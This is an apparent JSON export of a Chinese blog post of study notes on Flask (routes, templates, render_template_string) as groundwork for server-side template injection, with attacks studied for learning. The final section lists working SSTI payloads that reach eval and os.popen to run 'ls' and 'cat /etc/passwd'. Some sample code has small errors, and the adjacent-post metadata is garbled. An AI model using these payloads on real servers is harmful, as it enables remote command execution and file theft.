{"title":"ssti模板注入学习笔记-flask前置知识","uid":"1e1792beaab2c135cf1beec290eff7af","slug":"flask_study","date":"2023-04-14T10:49:36.000Z","updated":"2023-05-10T11:44:14.126Z","comments":true,"path":"api/articles/flask_study.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/1.jpg","content":"<p>flask是一个使用python编写的轻量级web应用框架</p>\n<p>python可以直接用flask启动一个web服务页面</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">cd &#x2F;opt&#x2F;flask1\nsource .&#x2F;bin&#x2F;activate\ncd &#x2F;root\nvim demo.py\npython3 demo.py</code></pre>\n\n<p>其中demo.py文件:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from flask import Flask     #启动flask模块，创建一个Flask类\napp &#x3D; Flask(__name__)       #__name__是系统变量，指的是本py文件的文件名\n\n#路由：基于浏览器输入的字符串寻址\n@app.route(&#39;&#x2F;world&#39;)             \ndef hello():\n    return &quot;hello world&quot;\n@app.route(&#39;&#x2F;man&#39;)             \ndef hello():\n    return &quot;hello man&quot;\n\n#只能被python直接运行，而不能被作为组件或模块被调用\nif __name__&#x3D;&#x3D;&#39;__main__&#39;: \n    app.run(debug&#x3D;True,host&#x3D;&quot;0.0.0.0&quot;,port&#x3D;8081)      #改完配置自动生效\n    #debug建议只能在学习中开启  host&#x3D;&quot;0.0.0.0&quot;监听所有的物理接口</code></pre>\n\n<h3 id=\"flask变量规则\"><a href=\"#flask变量规则\" class=\"headerlink\" title=\"flask变量规则\"></a>flask变量规则</h3><p>通过向规则参数添加变量部分，可以动态构建URL</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from flask import Flask\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;hello&#x2F;&lt;name&gt;&#39;)\ndef hello(name):\n    return &quot;hello %s&quot; % name\n@app.route(&#39;int&#x2F;&lt;ID&gt;&#39;)\ndef hello(ID):\n    return &quot;hello %d&quot; % ID\n\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.run(debug&#x3D;True)</code></pre>\n\n<h3 id=\"flask-HTTP方法\"><a href=\"#flask-HTTP方法\" class=\"headerlink\" title=\"flask HTTP方法\"></a>flask HTTP方法</h3><p>在python demo.py中插入路由:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">@app.route(&#39;&#x2F;login&#39;,methods&#x3D;[&#39;POST&#39;,&#39;GET&#39;])\ndef login():\n    if request.method &#x3D;&#x3D; &#39;POST&#39;:\n        print(1)\n        user &#x3D; request.form[&#39;ben&#39;]\n        return redirect(url_for(&#39;success&#39;,name &#x3D; user))     #redirect重定向\n    else:\n        print(2)\n        user &#x3D; request.args.get(&#39;ben&#39;)\n        return redirect(url_for(&#39;success&#39;,name &#x3D; user))</code></pre>\n\n<h3 id=\"flask模板\"><a href=\"#flask模板\" class=\"headerlink\" title=\"flask模板\"></a>flask模板</h3><h5 id=\"视图函数：主要作用是生成请求的相应\"><a href=\"#视图函数：主要作用是生成请求的相应\" class=\"headerlink\" title=\"视图函数：主要作用是生成请求的相应\"></a>视图函数：主要作用是生成请求的相应</h5><p>把业务逻辑和表现内容放在一起，会增加代码的复杂度和维护成本</p>\n<h5 id=\"使用模板：使用静态的页面html展示动态的内容\"><a href=\"#使用模板：使用静态的页面html展示动态的内容\" class=\"headerlink\" title=\"使用模板：使用静态的页面html展示动态的内容\"></a>使用模板：使用静态的页面html展示动态的内容</h5><p>模板是一个响应文本的文件，其中使用占位符（变量）表示动态部分。<br>代码结构清晰，耦合度低</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">· 处理业务逻辑：视图函数只负责业务逻辑和数据处理\n· 返回相应内容：模板取到视图函数的数据结果来进行展示</code></pre>\n\n<h3 id=\"render-template\"><a href=\"#render-template\" class=\"headerlink\" title=\"render_template\"></a>render_template</h3><p>加载html文件，默认文件路径在templates目录下。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from flask import Flask,render_template\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    return render_template(&quot;index.html&quot;)\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()</code></pre>\n\n<p>在templates目录下创建index.html文件</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">&lt;html lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Title&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n    模板html展示页面\n&lt;br&gt;\n    &#123;&#123;my_str&#125;&#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;</code></pre>\n\n<p>两者结合：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from flask import Flask,render_template\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    my_str &#x3D; &#39;Hello world&#39;\n    my_int &#x3D; 12\n    my_array &#x3D; [5,2,0,1,3,1,4]\n    my_duct &#x3D; &#123;\n        &#39;name&#39; &#x3D; &#39;dazhuang&#39;,\n        &#39;age&#39;:18\n    &#125;\n    return render_template(&quot;index.html&quot;,\n    my_str&#x3D;my_str,\n    my_int&#x3D;my_int,\n    my_arry&#x3D;my_array,\n    my_dict&#x3D;my_dict\n    )\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()</code></pre>\n\n<h3 id=\"render-template-string\"><a href=\"#render-template-string\" class=\"headerlink\" title=\"render_template_string\"></a>render_template_string</h3><p>用于渲染字符串，直接定义内容</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from flask import Flask,render_template\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    my_str &#x3D; &#39;Hello world&#39;\n    my_int &#x3D; 12\n    my_array &#x3D; [5,2,0,1,3,1,4]\n    my_duct &#x3D; &#123;\n        &#39;name&#39; &#x3D; &#39;nannan&#39;,\n        &#39;age&#39;:18\n    &#125;\n    return render_template_string(&#39;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;title&gt;Title&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;模板html展示页面&lt;br&gt;%d&lt;br&gt;%s&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&#39; % (my_int,my_str))\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()</code></pre>\n\n<h3 id=\"python中的继承关系\"><a href=\"#python中的继承关系\" class=\"headerlink\" title=\"python中的继承关系\"></a>python中的继承关系</h3><p>父类和子类（子类调用父类下的其他子类）<br><em>~python flask脚本没有办法直接执行python指令</em><br>object是父子关系的顶端，所有数据类型最终的父类都是object</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">class A:pass\nclass B(A):pass\nclass C(B):pass\nclass D(B):pass\nc &#x3D; c()\n\nprint(c.__class__)                              # &lt;class &#39;__main__.C&#39;&gt; 当前类C\nprint(c.__class__.__base__)                     # &lt;class &#39;__main__.B&#39;&gt; 当前类的父类B\nprint(c.__class__.__base__.__base__)            # &lt;class &#39;__main__.A&#39;&gt;\nprint(c.__class__.__base__.__base__.__base__)   # &lt;class &#39;object&#39;&gt;\nprint(c.__class__.__mro__)                      # 上面四个层层递进一起输出\nprint(c.__class__.__base__.__subclasses__())    # B下的所有子类（数组形式）\nprint(c.__class__.__base__.__subclasses__()[1]) #调用子类D</code></pre>\n\n<h5 id=\"魔术方法\"><a href=\"#魔术方法\" class=\"headerlink\" title=\"魔术方法\"></a>魔术方法</h5><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">__class__           #查找当前类型的所属对象\n__base__            #沿着父子类的关系往上走一个\n__mro__             #查找当前类对象的所有继承类\n__subclasses__()    #查找父类下的所有子类</code></pre>\n\n<p>简单的payload（注意类型）</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;\n&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()&#125;&#125;    #str类型\n&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;    #list类型\n&#123;&#123;().__class__.__base__.__subclasses__()&#125;&#125;    #元组类型</code></pre>\n\n<p>然后，寻找一些关键的模块</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;\n#例如：os.wrap_close       #找到对应的列数\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117]&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;\n# __builtins__提供对python的所有&quot;内置&quot;标识符的直接访问\n# eval()计算字符串表达式的值\n# popen()执行一个shell以运行命令来开启一个进程\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;\n#这里也可以直接调用</code></pre>\n\n\n\n\n","feature":true,"text":"flask是一个使用python编写的轻量级web应用框架 python可以直接用flask启动一个web服务页面 cd &#x2F;opt&#x2F;flask1 source .&#x2F;bin&#x2F;activate cd &#x2F;root vim demo.py...","link":"","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 mins."},"categories":[{"name":"文章","slug":"文章","count":5,"path":"api/categories/文章.json"}],"tags":[{"name":"ssti模板注入","slug":"ssti模板注入","count":2,"path":"api/tags/ssti模板注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#flask%E5%8F%98%E9%87%8F%E8%A7%84%E5%88%99\"><span class=\"toc-text\">flask变量规则</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#flask-HTTP%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">flask HTTP方法</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#flask%E6%A8%A1%E6%9D%BF\"><span class=\"toc-text\">flask模板</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%A7%86%E5%9B%BE%E5%87%BD%E6%95%B0%EF%BC%9A%E4%B8%BB%E8%A6%81%E4%BD%9C%E7%94%A8%E6%98%AF%E7%94%9F%E6%88%90%E8%AF%B7%E6%B1%82%E7%9A%84%E7%9B%B8%E5%BA%94\"><span class=\"toc-text\">视图函数：主要作用是生成请求的相应</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8%E6%A8%A1%E6%9D%BF%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9D%99%E6%80%81%E7%9A%84%E9%A1%B5%E9%9D%A2html%E5%B1%95%E7%A4%BA%E5%8A%A8%E6%80%81%E7%9A%84%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">使用模板：使用静态的页面html展示动态的内容</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#render-template\"><span class=\"toc-text\">render_template</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#render-template-string\"><span class=\"toc-text\">render_template_string</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#python%E4%B8%AD%E7%9A%84%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB\"><span class=\"toc-text\">python中的继承关系</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">魔术方法</span></a></li></ol></li></ol></li></ol>","author":{"name":"南瓜の无名","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/head.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"ssti模板注入学习笔记-漏洞原理及漏洞应用","uid":"3137c2b6b2ca0e39e8c62639d966b498","slug":"ssti1","date":"2023-04-21T10:49:36.000Z","updated":"2023-05-19T09:54:13.469Z","comments":true,"path":"api/articles/ssti1.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/2.jpg","text":"ssti模板注入flask漏洞-代码不严谨可能造成任意文件读取和RCE远程控制控制后台系统 漏洞成因：~~ 渲染模板时，没有严格控制对用户的输入~~ 使用了危险的模板，导致用户可以和flask程序进行交互 flask是基于python开发的一种web框架，那么也就意味着如果用户可...","link":"","photos":[],"count_time":{"symbolsCount":"26k","symbolsTime":"23 mins."},"categories":[{"name":"文章","slug":"文章","count":5,"path":"api/categories/文章.json"}],"tags":[{"name":"ssti模板注入","slug":"ssti模板注入","count":2,"path":"api/tags/ssti模板注入.json"}],"author":{"name":"南瓜の无名","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/head.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"8086���ѧϰ�ʼ�_01","uid":"58b03921103086d720a737ff98d22df3","slug":"8086汇编01","date":"2023-07-14T03:20:34.000Z","updated":"2023-07-29T03:48:36.505Z","comments":true,"path":"api/articles/8086汇编01.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/6.jpg","text":"һ���Ĵ�����CPU����ԭ����CPU���� �����������������Ĵ�������������Щ�������ڲ����������� 8086 CPU ��14���Ĵ����� AX BX CX DX SI DI SP BP IP CS SS DS...","link":"","photos":[],"count_time":{"symbolsCount":"9k","symbolsTime":"8 mins."},"categories":[{"name":"����","slug":"����","count":1,"path":"api/categories/����.json"}],"tags":[{"name":"8086���","slug":"8086���","count":1,"path":"api/tags/8086���.json"}],"author":{"name":"南瓜の无名","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/nanguawuming/CDN@1.0/picture/head.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":false}}